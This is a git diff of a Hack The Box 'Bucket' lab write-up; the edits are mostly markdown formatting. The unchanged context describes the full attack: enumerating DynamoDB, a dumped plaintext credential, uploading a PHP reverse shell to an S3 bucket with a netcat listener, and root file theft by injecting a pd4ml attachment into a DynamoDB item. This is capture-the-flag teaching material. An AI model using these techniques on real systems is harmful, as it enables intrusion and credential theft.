@@ -1,6 +1,6 @@
 ![](bucket_banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
 </p>
 
 # Scanning
@@ -38,23 +38,23 @@ PORT   STATE SERVICE VERSION
 ```
 ### /health
 
-- __goto__ `s3.bucket.htb/health/` shows
+- **goto** `s3.bucket.htb/health/` shows
 
 	{"status": "running"}
 
-- __goto__ `s3.bucket.htb/health` shows
+- **goto** `s3.bucket.htb/health` shows
 
 	{"services": {"s3": "running", "dynamodb": "running"}}
 
 - so 2 services running, whom i know nothing about ,
 
-__ask google__
+**ask google**
 
-__s3 :__ Amazon S3 or Amazon Simple Storage Service is a service offered by Amazon Web Services that provides object storage through a web service interface. 
+**s3 :** Amazon S3 or Amazon Simple Storage Service is a service offered by Amazon Web Services that provides object storage through a web service interface. 
 
 - so s3 is a amazon aws service which store data inside digital buckets .
 
-__dynamodb :__ Amazon DynamoDB is a fully managed proprietary NoSQL database service that supports key-value and document data structures and is offered by Amazon.com as part of the Amazon Web Services portfolio.
+**dynamodb :** Amazon DynamoDB is a fully managed proprietary NoSQL database service that supports key-value and document data structures and is offered by Amazon.com as part of the Amazon Web Services portfolio.
 
 - so dynamodb is a database service that manage bucket data .
 - these services running on `hypercorn-h11` server , [DOC](https://pypi.org/project/Hypercorn/) .
@@ -73,7 +73,7 @@ __dynamodb :__ Amazon DynamoDB is a fully managed proprietary NoSQL database ser
 ### Configure awscli
 
 - before running `awscli` we need to configure it but when i configuring it asking for `access_key` and `secret_key` and i don't have these or don't know about
-- some __googling__ i found a [document](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/DynamoDBLocal.DownloadingAndRunning.html)
+- some **googling** i found a [document](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/DynamoDBLocal.DownloadingAndRunning.html)
 - doc tells `any credentials to work`
 
 	`aws configure`
@@ -85,7 +85,7 @@ __dynamodb :__ Amazon DynamoDB is a fully managed proprietary NoSQL database ser
 
 ### Dump Data
 
-- __First__, find the table name, [template](awsApiTmpl/list-table.js) for webshell
+- **First**, find the table name, [template](awsApiTmpl/list-table.js) for webshell
 
 	`aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/ | jq -r .`
 
@@ -95,7 +95,7 @@ __dynamodb :__ Amazon DynamoDB is a fully managed proprietary NoSQL database ser
     	  ]
 	  }
 
-- __Second__, scan `users` table, [template](awsApiTmpl/scan-tmpl.js) for webshell
+- **Second**, scan `users` table, [template](awsApiTmpl/scan-tmpl.js) for webshell
 
 	`aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/ | jq -r .`
 
@@ -248,15 +248,15 @@ Sysadm:n2vM-<_K_Q:.Aa2
 
 # user Exploit
 
-- __First__, upload php shell in the bucket 
+- **First**, upload php shell in the bucket 
 
 	`aws --endpoint-url=http://s3.bucket.htb s3 cp shell.php s3://adserver`
 
-- __Second__, open netcat listener
+- **Second**, open netcat listener
 
 	`nc -nvlp 4141`
 
-- __Third__, after sometime i go to `bucket.htb/shell.php` and shell pops in the netcat
+- **Third**, after sometime i go to `bucket.htb/shell.php` and shell pops in the netcat
 - got `www-data` shell
 
 ## Enumerating www-data
@@ -316,7 +316,7 @@ dd3f563b************************
 	  drwxr-x---+  4 root root 4096 Sep 23 10:56 bucket-app
 	  drwxr-xr-x   2 root root 4096 Nov  4 08:20 html
 
-- __goto__ local server directory `/var/www/bucket-app/` found `index.php`
+- **goto** local server directory `/var/www/bucket-app/` found `index.php`
 
 	  roy@bucket:/var/www/bucket-app$ ls -la | grep index.php
 	  `-rwxr-x---+  1 root root  17222 Sep 23 03:32 index.php`
@@ -356,13 +356,13 @@ else
 
 ### script breakdown
 
-- __line 04__, First if statement
+- **line 04**, First if statement
 
 	  if($_SERVER["REQUEST_METHOD"]==="POST")
 
 	- this define that the script excecute if user send a `POST` request .
 
-- __line 05__, Second if statement
+- **line 05**, Second if statement
 
 	  if($_POST["action"]==="get_alerts")
 
@@ -370,7 +370,7 @@ else
 
 - so i need to send a `POST` request with `action=get_alerts`
 
-- __line 07-12__, client veriable
+- **line 07-12**, client veriable
 
 	  $client = new DynamoDbClient([
 	                          'profile' => 'default',
@@ -381,7 +381,7 @@ else
 
 	- this code configure aws client connection
 
-- __line 14-18__, iteration veriable
+- **line 14-18**, iteration veriable
 
 	  $iterator = $client->getIterator('Scan', array(
 	                          'TableName' => 'alerts',
@@ -395,7 +395,7 @@ else
 - I think i need to create a table table before trigger that script
 - so i need to create a `alerts` table which contains item `Ransomwar`
 
-- __line 20-23__, foreach loop through the `$iterator` veriable
+- **line 20-23**, foreach loop through the `$iterator` veriable
 
 	  foreach ($iterator as $item) {
 	                          $name=rand(1,10000).'.html';
@@ -409,7 +409,7 @@ else
 	  	  roy@bucket:/var/www/bucket-app$ ls -la | grep files
 		  drwxr-x---+  2 root root   4096 Sep 23 03:29 files
 
-- __line 24__, passthru function, [php documentation](https://www.php.net/manual/en/function.passthru.php)
+- **line 24**, passthru function, [php documentation](https://www.php.net/manual/en/function.passthru.php)
 
 	  passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
 
@@ -420,8 +420,8 @@ else
 		  `-rwxr-x---+  1 root root 808729 Jun 10 11:50 pd4ml_demo.jar`
 
 	- and then execute `pd4cmd` from `pd4ml` library
-	- __PD4ML__ is a Java library, which makes possible to create PDF documents from Java and JSP applications using HTML as template language
-	- here is the __pd4cmd__ [documentation](https://pd4ml.com/html-to-pdf-command-line-tool.htm) from pd4ml tool
+	- **PD4ML** is a Java library, which makes possible to create PDF documents from Java and JSP applications using HTML as template language
+	- here is the **pd4cmd** [documentation](https://pd4ml.com/html-to-pdf-command-line-tool.htm) from pd4ml tool
 	- so what is happening here is that the `pd4cmd` convert html file into a pdf file and store in the `files/` direcotry as `result.pdf`
 
 ### Exploit Surface
@@ -433,7 +433,7 @@ else
 
 # Root Privesc
 
-__First__, create `alerts` table , [template](awsApiTmpl/createTable-tmpl.js) for webshell
+**First**, create `alerts` table , [template](awsApiTmpl/createTable-tmpl.js) for webshell
 ```bash
 aws dynamodb create-table \
     --table-name alerts \
@@ -446,7 +446,7 @@ aws dynamodb create-table \
         --endpoint-url=http://s3.bucket.htb
 ```
 
-__Second__, put `Ransomware` item , [template](awsApiTmpl/putItem-tmpl.js) for webshell
+**Second**, put `Ransomware` item , [template](awsApiTmpl/putItem-tmpl.js) for webshell
 ```bash
 aws dynamodb put-item \
 --table-name alerts  \
@@ -457,18 +457,18 @@ aws dynamodb put-item \
 
 *specify `pd4ml:attachment` function as item `Ransomware` data so when pd4cmd convert html file into pdf it also attech that file i specified*
 
-__Third__, create tunnel on port 8000 with ssh
+**Third**, create tunnel on port 8000 with ssh
 ```bash
 ssh -L 8000:127.0.0.1:8000 roy@bucket.htb
 ```
 
-__Fourth__, send a post request to `127.0.0.1:8000`
+**Fourth**, send a post request to `127.0.0.1:8000`
 
 `curl -X POST -d "action=get_alerts" http://127.0.0.1:8000/ -v`
 
 *as soon as request send successfully `result.pdf` file created*
 
-__Note__, `result.pdf` file deletes immediately after created in less then `~10sec` and created table
+**Note**, `result.pdf` file deletes immediately after created in less then `~10sec` and created table
 
 *to tackle this problem i use sshpass with scp and copy `result.pdf` file in my local machine as soon as it created*
 
